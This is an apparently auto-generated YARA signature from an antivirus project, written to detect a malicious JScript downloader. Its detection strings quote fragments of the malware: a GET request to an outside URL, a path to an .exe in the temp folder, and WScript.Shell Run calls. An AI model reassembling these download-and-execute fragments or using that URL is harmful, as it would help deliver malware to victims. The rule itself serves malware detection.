rule sig_20160328_dbc5df76ae5065be0ea10ffc2d60438b {
  meta:
    description = "datamaliciousorder - file 20160328_dbc5df76ae5065be0ea10ffc2d60438b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3ee833631631a2513dfa50001d97801734978b6d6567b4db3f01c55d4cd4bc16"

  strings:
    $s1  = "function Rsievbnmis() {return Aofqy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QHu9Ze0qSDMRxF.exe\";};" fullword ascii
    $s2  = "Mydlyg[Etlflapzn](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Iwhccrtp](Vwedk() * 11)} while (Mydlyg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Aofqy = function Svqxy() {return WScript[Wvmng](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Peimw(Vbsdq, Wcdvs){return Vbsdq - Wcdvs;};" fullword ascii
    $s6  = "function Ashfuoeh(Slhqje){Aofqy[\"Run\"](Slhqje, Kicyn, Kicyn);};" fullword ascii
    $s7  = "function Lwhjjlewfl(){return Wcusoxxd;};" fullword ascii
    $s8  = "function Lyovruxv(Rpjzvlt) {var Dqmmif = (1, 2, 3, 4, 5, Rpjzvlt); return Dqmmif;};" fullword ascii
    $s9  = "function Fstsmpgwdt(){return Wvmng;};" fullword ascii
    $s10 = " while (Awcwviyw){" fullword ascii
    $s11 = "var Pcvuglb = new this[\"Date\"]();" fullword ascii
    $s12 = "Bgrfqrzjs = true; " fullword ascii
    $s13 = "var Bgrfqrzjs = false;" fullword ascii
    $s14 = "var Icwxazuui = false;" fullword ascii
    $s15 = "function Feace()" fullword ascii
    $s16 = "function Vwedk(){return 22;};" fullword ascii
    $s17 = "return Peimw(Zowpd, Sqwjfopwt);" fullword ascii
    $s18 = "var Wsxzchs = false;" fullword ascii
    $s19 = "Wsxzchs = true; " fullword ascii
    $s20 = "function Bmaca() {return ((Wsxzchs == true) && (Wsxzchs == Bgrfqrzjs)) ? 1 : Kicyn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}